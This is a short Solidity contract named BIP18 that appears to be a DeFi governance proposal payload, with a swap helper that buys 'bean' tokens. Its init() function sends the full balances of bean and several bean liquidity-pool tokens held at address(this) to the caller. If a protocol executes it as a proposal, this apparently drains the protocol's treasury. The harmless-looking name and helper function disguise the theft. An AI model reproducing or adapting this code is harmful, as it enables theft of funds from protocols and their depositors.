pragma solidity ^ 0.8.0;
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
interface Irouter{
        function swapExactETHForTokens(uint , address[] calldata , address , uint)
        external
        payable
        returns (uint[] memory amounts);
}
contract BIP18{
        address public router                   = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address public weth                     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address public beanTokenAddress         = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;
    function init() public{
        IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db).transfer(msg.sender, IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db).balanceOf(address(this)));//bean
        IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371).transfer(msg.sender, IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371).balanceOf(address(this)));//wethBeanLP
        IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).transfer(msg.sender, IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).balanceOf(address(this)));//beanCrv
        IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D).transfer(msg.sender, IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D).balanceOf(address(this)));//beanLusd
    }    
    function getSomeBeans() external payable returns (uint){
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = beanTokenAddress;
        uint256[] memory res;
        res = Irouter(router).swapExactETHForTokens{value:msg.value}(211000000000, path, msg.sender, block.timestamp);
        return res[1];
    }
}